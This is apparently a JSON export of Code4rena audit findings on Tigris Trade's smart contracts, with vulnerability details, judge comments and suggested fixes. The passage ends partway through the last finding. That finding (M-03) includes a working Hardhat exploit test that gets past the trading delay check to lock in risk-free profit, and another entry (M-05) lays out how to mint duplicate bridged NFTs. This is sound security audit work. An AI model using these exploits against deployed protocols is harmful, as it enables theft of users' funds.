      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285\n\n\n## Vulnerability details\n\nBoth `BondNFT` and `GovNFT` are an ERC721 implementation, they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once.\nHowever the function doesn't actually safe transfer (doesn't )\n\n## Impact\nUsers might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.\n\n## Proof of Concept\nI've added the following tests to the `GovNFT` tests.\n1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer.\n2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.\n\n```diff\ndiff --git a/test/05.GovNFT.js b/test/05.GovNFT.js\nindex 711a649..d927320 100644\n--- a/test/05.GovNFT.js\n+++ b/test/05.GovNFT.js\n@@ -98,6 +98,14 @@ describe(\"govnft\", function () {\n       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);\n       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);\n     });\n+\n+    it(\"Safe transfer to non ERC721Receiver\", async function () {\n+      \n+      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n+    it(\"Safe transfer many  to non ERC721Receiver\", async function () {\n+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n     it(\"Transferring an NFT with pending delisted rewards should not affect pending rewards\", async function () {\n       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);\n       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);\n\n```\n\nOutput (I've shortened the output. following test will also fail, since the successful transfer will affect them):\n\n```\n       Safe transfer to contract\n      1) Safe transfer many to contract\n\n\n  11 passing (3s)\n  1 failing\n\n  1) govnft\n       Reward system related functions\n         Safe transfer many to contract:\n\n      AssertionError: Expected transaction to be reverted\n      + expected - actual\n\n      -Transaction NOT reverted.\n      +Transaction reverted.\n```\n\n\n## Recommended Mitigation Steps\nCall `_safeTransfer()` instead of `_transfer()`.",
      "summary": "\nThis bug report outlines a vulnerability in the `BondNFT` and `GovNFT` ERC721 implementations. The vulnerability is in the `safeTransferMany()` function, which does not actually use safe transfer and could lead to users getting their funds stuck in a contract that does not support ERC721. To prove the vulnerability, tests were added to the `GovNFT` tests that showed the expected behavior of the `safeTransferFrom()` function succeeding, but the `safeTransferMany()` function not reverting.\n\nThe recommended mitigation step is to call `_safeTransfer()` instead of `_transfer()` when using the `safeTransferMany()` function.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/356",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "8olidity",
        "0xmuxyz",
        "0xA5DF",
        "0x4non"
      ]
    },
    {
      "id": "6338",
      "title": "[M-08] GovNFT: maxBridge has no effect",
      "impact": "MEDIUM",
      "content": "\nIn GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT.\n\n```solidity\n    uint256 public maxBridge = 20;\n...\n    function setMaxBridge(uint256 _max) external onlyOwner {\n        maxBridge = _max;\n    }\n```\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313>\n\n### Recommended Mitigation Steps\n\nConsider applying the maxBridge variable.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1399552931):**\n> The Warden has shown how, an unused variable, which was meant to cap the amount of tokens bridged per call, could cause a DOS.\n> \n> These types of DOS could only be fixed via Governance Operations, and could create further issues, for this reason I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed and resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1407515433):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175169 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about GovNFT, a smart contract. In GovNFT, the setMaxBridge function is provided to set a maximum bridge limit, but this variable is not used and does not work. This means that the number of GovNFTs crossing the chain is not limited. A proof of concept is provided in the report. No tools were used to find the bug. \n\nThe recommended mitigation step is to consider applying the maxBridge variable, so that the number of GovNFTs crossing the chain is limited.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/334",
      "tags": [],
      "finders": [
        "cccz",
        "unforgiven",
        "Madalad",
        "0xbepresent"
      ]
    },
    {
      "id": "6337",
      "title": "[M-07] Trading will not work on Ethereum if USDT is used",
      "impact": "MEDIUM",
      "content": "\nTraders will not be able to:\n\n1.  Initiate a market order\n2.  Add margin\n3.  Add to position\n4.  initiate limit order\n\nIf USDT is set as the margin asset and protocol is deployed on Ethereum.\n\n(Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on Ethereum).\n\n### Proof of Concept\n\n`USDT` has a race condition protection mechanism on ethereum chain:\n\nIt does not allow users to change the allowance without first changing the allowance to 0.\n\n`approve` function in `USDT` on Ethereum: <br><https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205>\n\n        function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\n\n            // To change the approve amount you first have to reduce the addresses`\n            //  allowance to zero by calling `approve(_spender, 0)` if it is not\n            //  already 0 to mitigate the race condition described here:\n            //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n            require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n\n            allowed[msg.sender][_spender] = _value;\n            Approval(msg.sender, _spender, _value);\n        }\n\nIn `Trading`, if users use `USDT` as margin to:\n\n1.  Initiate a market order\n2.  Add margin\n3.  Add to position\n4.  initiate limit order\n\nThe transaction will revert.\n\nThis is due to the the `_handleDeposit` which is called in all of the above uses.\n\n`_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`.\n\nFrom the second time `approve` will be called, the transaction will revert.\n\n`_handleDeposit` in `Trading`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652>\n\n        function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault\n    , ERC20PermitData calldata _permitData, address _trader) internal {\n    ------\n                IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n                IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n                IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n    ------\n        }\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nNo need to to approve `USDT` every time.\nThe protocol could:\n\n1.  Keep a record if allowance was already set on an address\n2.  Create an external function that can be called by the owner to approve the a token address\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/198)**  \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1385223243):**\n > In contrast to unsafeERC20 functions (OOS), this report shows an issue with USDT or similar tokens that require a zero to non-zero allowance.\n> \n> Not resetting to zero and instead calling to set max multiple times will cause reverts in those cases.\n> \n> For this reason I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/198#issuecomment-1407500907):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174789 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Trading contract that exists when USDT is set as the margin asset and the protocol is deployed on Ethereum. This vulnerability prevents traders from initiating a market order, adding margin, adding to position and initiating limit order. The issue was submitted after consulting with the sponsor, even though there were no plans to deploy the platform on Ethereum.\n\nThe vulnerability is caused by the approve function in USDT on Ethereum, which requires users to first change the allowance to 0 before changing it again. This is to mitigate the race condition described in the EIPs. The _handleDeposit function in Trading calls the USDT margin asset approve function with type(uint).max, which will cause the transaction to revert from the second time it is called.\n\nThe recommended mitigation steps are to keep a record if allowance was already set on an address, and create an external function that can be called by the owner to approve the token address. This will prevent the need to approve USDT every time.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/198",
      "tags": [],
      "finders": [
        "8olidity",
        "Faith",
        "0x52",
        "rbserver",
        "Rolezn",
        "Ruhum",
        "KingNFT",
        "0xdeadbeef0x",
        "mookimgo"
      ]
    },
    {
      "id": "6336",
      "title": "[M-06] BondNFTs can revert when transferred",
      "impact": "MEDIUM",
      "content": "\n`BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against.\n\nThe proposal for context: <https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3>\n\nThe current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.\n\nThe impact if no rewards are distributed in the same day:\n\n1.  `BondNFT`s listed on open markets will not be able to fulfill the orders\n2.  `BondNFT`s deposited as collateral will not be able to release the collateral\n\nBecause other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.\n\nRealistic examples could be `BondNFT`s listed on OpenSea.\n\nExample of reasons why rewards would not be distributed in the same day:\n\n1.  Low activity from investors, rewards are distributed when users lock/release/extend\n2.  `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.\n\n### Proof of Concept\n\n`BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.\n\n`distribute` function in `BondNFT`: <br><https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221>\n\n        function distribute(\n            address _tigAsset,\n            uint _amount\n        ) external {\n            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n            unchecked {\n                uint aEpoch = block.timestamp / DAY;\n                if (aEpoch > epoch[_tigAsset]) {\n                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                        epoch[_tigAsset] += 1;\n                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                    }\n                }\n                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n            }\n            emit Distribution(_tigAsset, _amount);\n        }\n\n(Please note that if the asset is blacklisted through `allowedAsset`, the  `epoch[tigAsset]` will not be updated)\n\nWhen `BondNFT`s are transferred, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.\n\nAccording to the sponsor, the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.\n\n`_transfer` function in `BondNFT`: \n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329>\n\n        function _transfer(\n            address from,\n            address to,\n            uint256 _id\n        ) internal override {\n            Bond memory bond = idToBond(_id);\n            require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n            require(!bond.expired, \"Expired!\");\n            unchecked {\n                require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n                userDebt[from][bond.asset] += bond.pending;\n                bondPaid[_id][bond.asset] += bond.pending;\n            }\n            super._transfer(from, to, _id);\n        }\n\nAs can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.\n\n### Hardhat POC\n\nThere is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472>\n\n        it(\"Bond can only transferred if epoch is updated\", async function () {\n          await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"3000\"));\n          await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(\"3000\"), 365);\n\n          await network.provider.send(\"evm_increaseTime\", [864000]);\n          await network.provider.send(\"evm_mine\");\n\n          await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith(\"Bad epoch\");\n        });\n\n### Tools Used\n\nVS Code, Hardhat\n\n### Recommended Mitigation Steps\n\nThe reason for the check is to validate that a bond.expired updated according to the actual timestamp.\n\nInstead of having\n\n            require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n            require(!bond.expired, \"Expired!\");\n\nYou could replace it with:\n\n     require(bond.expireEpoch  >= block.timestamp/DAY, \"Transfer after expired not allowed\");\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/162)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1383893616):**\n > The warden has shown a way for the BondNFT to not be transferable, because this shows a functionality loss, given a specific circumstance, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/162#issuecomment-1407489822):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174264  \n\n***\n\n",
      "summary": "\nThis bug report is about the BondNFT contract, which should be transferrable but is not due to a check implemented in the _transfer function. The check requires that the epoch[tigAsset] is updated to the current day, otherwise the transfer will fail. This can cause two major impacts: BondNFTs listed on open markets will not be able to fulfil orders, and BondNFTs deposited as collateral will not be release the collateral. The reason for the check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated. A proof of concept has been implemented to show that transfers fail when epoch[tigAsset] is not updated. The recommended mitigation steps are to replace the check with a requirement that bond.expireEpoch is greater than or equal to block.timestamp/DAY.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/162",
      "tags": [],
      "finders": [
        "0xdeadbeef0x"
      ]
    },
    {
      "id": "6335",
      "title": "[M-05] Failure in endpoint can cause minting more than one NFT with the same token id in different chains",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168\n\n\n## Vulnerability details\n\n## Impact\n\nIn the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:\n>NFT holders only earn the profits generated by the platform on the chain that the NFT is on.\n\nIt is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to have more than one NFT with the same token id on different chains.\n\n## Proof of Concept\n\n - Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124\n - The `endpoint` is responsible to complete the bridging task on chain A.\n - Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful.\n```\nfunction lzReceive(\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) external override {\n        require(_msgSender() == address(endpoint), \"!Endpoint\");\n        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n        // try-catch all errors/exceptions\n        if (!success) {\n            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n        }\n    }\n```\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168\n - Since the transaction was not successful, the message will be added as a failed message.\n```\nfailedMessages[chainB][Bob's address][_nonce] = keccak256(_payload);\n```\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178\n - Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows:\n`lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n - Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.\n - Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.\n - Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.\n - He calls the function `retryMessage` to retry the failed message on chain A.\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206\n - By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:\n`retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n - Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability. \n - Now he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n - Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.\n\n***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to both having failed message and being able to mint it at the same time.***\n\nPlease note that if this scenario happens again, more NFT with the same token id X will be minted to Bob on different chains.\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nIt is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later.\n```\nmapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;\n\n    function lzReceive(\n        uint16 _srcChainId,\n        bytes memory _srcAddress,\n        uint64 _nonce,\n        bytes memory _payload\n    ) external override {\n        \n        require(!consumedMessage[_srcChainId][_srcAddress][_nonce], \"already consumed\");\n        consumedMessage[_srcChainId][_srcAddress][_nonce] = true;\n\n        require(_msgSender() == address(endpoint), \"!Endpoint\");\n        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n        // try-catch all errors/exceptions\n        if (!success) {\n            failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n            emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n        }\n    }\n```",
      "summary": "\nA vulnerability has been identified in a smart contract called GovNFT, which is used to bridge governance NFTs between different chains. The vulnerability is that when a message is failed, it is not considered as consumed, so in case of a failure in the endpoint, it is possible to both have a failed message and be able to mint it at the same time. This means that a user could end up having two NFTs with the same token id on different chains.\n\nTo demonstrate the vulnerability, the example of Bob is used. Bob is an honest user who owns an NFT with token id X on chain B. He calls the function `crossChain` to bridge the NFT from chain B to chain A. The transaction is not successful, and the message is added as a failed message. Due to network lag, the endpoint assumes that the transaction is not sent, and it again calls this function with enough gas, so the NFT with token id X will be minted to Bob's address on chain A. Then, Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. Now, Bob has the NFT with token id X on both chain A and chain B. This means that he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n\nTo mitigate this vulnerability, it is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/150",
      "tags": [],
      "finders": [
        "HE1M"
      ]
    },
    {
      "id": "6334",
      "title": "[M-04] Approved operators of Position token cant call Trading.initiateCloseOrder",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\n\n\n## Vulnerability details\n\n## Impact\nApproved operators of owner of Position token can't call several function in Trading.\n\n## Proof of Concept\nFunctions that accept Position token in Trading are checking that the caller is owner of token using _checkOwner function.\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\n```soldiity\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n```\nAs you can see this function doesn't allow to approved operators of token's owner to pass the check. As result functions are not possible to call for them on behalf of owner.\nFor example [here](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235) there is a check that doesn't allow to call initiateCloseOrder function.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nAllow operators of token's owner to call functions on behalf of owner.",
      "summary": "\nThis bug report is about a vulnerability that affects the Trading contract, which is part of the code-423n4/2022-12-tigris repository. The bug allows approved operators of the owner of the Position token to not be able to call several functions in the Trading contract. The bug is caused by a check in the _checkOwner function that doesn't allow the approved operators to pass the check, and thus the functions are not possible to call for them on behalf of the owner. The recommended mitigation step is to allow operators of the token's owner to call functions on behalf of the owner. The bug was discovered using the VsCode tool.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/124",
      "tags": [],
      "finders": [
        "__141345__  UniversalCrypto",
        "rvierdiiev"
      ]
    },
    {
      "id": "6333",
      "title": "[M-03] Bypass the delay security check to win risk free funds",
      "impact": "MEDIUM",
      "content": "\nThe current implementation uses `_checkDelay()` function to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\". But the protection is not enough, an attacker can long with low price and short with high price at the same tx but two orders to lock profit and take risk free funds.\n\n### Proof of Concept\n\nThe following test case and comments show the details for how to exploit it:\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\n\ndescribe(\"Bypass delay check to earn risk free profit\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Simulate long with low price and short with high price at the same tx to lock profit\", function () {\n    let longId;\n    let shortId;\n    beforeEach(async function () {\n        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n        let PriceData = [node.address, 1, parseEther(\"1000\"), 0, 2000000000, false];\n        let message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, parseEther(\"1000\"), 0, 2000000000, false]\n          )\n        );\n        let sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        );\n        \n        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n        longId = await position.getCount();\n        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n        expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n\n        TradeInfo = [parseEther(\"1010\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n        PriceData = [node.address, 1, parseEther(\"1010\"), 0, 2000000000, false];\n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, parseEther(\"1010\"), 0, 2000000000, false]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        );\n        \n        PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n        shortId = await position.getCount();\n        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n        expect(await position.assetOpenPositionsLength(1)).to.equal(2);\n  \n    });\n\n\n    it.only(\"Exit at any price to take profit\", async function () {\n        // same time later, now we can close the orders\n        await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000100]);\n        await network.provider.send(\"evm_mine\");\n\n        // any new price, can be changed to other price such as 950, just ensure enough margin\n        let closePrice = parseEther(\"1050\");\n        let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n        let closeMessage = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            [node.address, 1, closePrice, 0, 2000000100, false]\n          )\n        );\n        let closeSig = await node.signMessage(\n          Buffer.from(closeMessage.substring(2), 'hex')\n        );\n        \n        let balanceBefore = await stabletoken.balanceOf(owner.address);\n        await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n        await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n        let balanceAfter = await stabletoken.balanceOf(owner.address);\n        let principal = parseEther(\"1000\").add(parseEther(\"1010\"));\n\n        let profit = balanceAfter.sub(balanceBefore).sub(principal);\n        expect(profit.gt(parseEther(`50`))).to.equal(true);\n    });\n\n    it.only(\"Exit with another price pair to double profit\", async function () {\n      // some time later, now we can close the orders\n      await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000100]);\n      await network.provider.send(\"evm_mine\");\n\n      // any new price pair, can be changed to 